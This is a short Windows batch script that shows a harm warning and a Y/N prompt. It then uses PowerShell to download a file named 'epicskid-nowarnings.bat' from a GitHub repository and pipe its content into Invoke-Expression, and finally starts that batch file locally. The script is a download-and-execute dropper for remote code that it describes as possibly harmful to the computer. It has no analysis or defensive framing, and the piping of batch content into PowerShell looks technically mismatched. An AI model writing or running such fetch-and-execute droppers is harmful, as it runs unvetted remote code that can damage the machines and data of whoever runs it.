@echo off

REM Display initial warning messages
echo Warning! Running this script may cause harm to your computer.
echo.
echo The creator is not responsible for any damage caused to your computer. Proceed at your own risk!
echo.

REM Prompt user to continue
set /p "continue=Do you want to continue? (Y/N): "
if /i "%continue%" neq "Y" goto :EOF

REM Download and run the first batch file from GitHub
powershell -command "& {(Invoke-WebRequest 'https://github.com/HazeeOnYT/epicskid/raw/9f6e444e7a546c9b9ff7382f31b7078c4c67793f/NO-WARNINGS/epicskid-nowarnings.bat' -UseBasicParsing).Content | Invoke-Expression}"

REM Start another instance of the same batch file
start "" "epicskid-nowarnings.bat"
